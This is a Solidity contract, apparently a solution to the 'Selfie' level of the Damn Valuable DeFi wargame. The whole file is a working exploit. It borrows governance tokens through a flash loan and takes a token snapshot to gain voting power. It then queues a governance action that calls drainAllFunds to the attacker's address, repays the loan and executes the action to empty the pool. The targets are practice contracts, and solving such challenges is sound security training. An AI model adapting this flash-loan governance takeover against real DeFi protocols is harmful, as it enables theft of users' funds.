// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract SelfieExploit {
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    SelfiePool public pool;
    uint256 actionId;
    address attacker;

    constructor(SimpleGovernance governanceAddress, SelfiePool poolAddress) {
        governance = governanceAddress;
        pool = poolAddress;
        attacker = msg.sender;
    }

    function attack(uint256 supply) public returns (uint256) {
        pool.flashLoan(supply);

        return actionId;
    }

    function drain() public {
        governance.executeAction(actionId);
    }

    function receiveTokens(address tokenAddress, uint256 amount)
        public
        payable
    {
        DamnValuableTokenSnapshot(tokenAddress).snapshot();
        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );
        DamnValuableTokenSnapshot(tokenAddress).transfer(address(pool), amount);
    }
}
